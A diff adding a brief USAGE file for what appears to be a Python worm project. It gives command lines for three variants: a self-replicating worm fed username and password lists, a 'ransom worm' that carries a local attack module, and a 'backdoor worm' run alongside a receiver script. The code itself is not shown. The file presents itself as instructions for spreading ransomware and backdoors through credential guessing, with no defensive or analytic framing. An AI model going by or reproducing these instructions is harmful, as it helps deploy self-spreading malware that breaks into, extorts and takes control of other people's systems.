@@ -1,0 +1,12 @@
+USAGE
+
+Replicator Worm
+$ python replicator.py usernames.txt passwords.txt
+
+Ransom Worm
+$ python replicator.py local_attack.py usernames.txt passwords.txt
+
+Backdoor Worm
+$ python recv.py
+(in new tab)
+$ python replicator.py local_backdoor.py usernames.txt passwords.txt
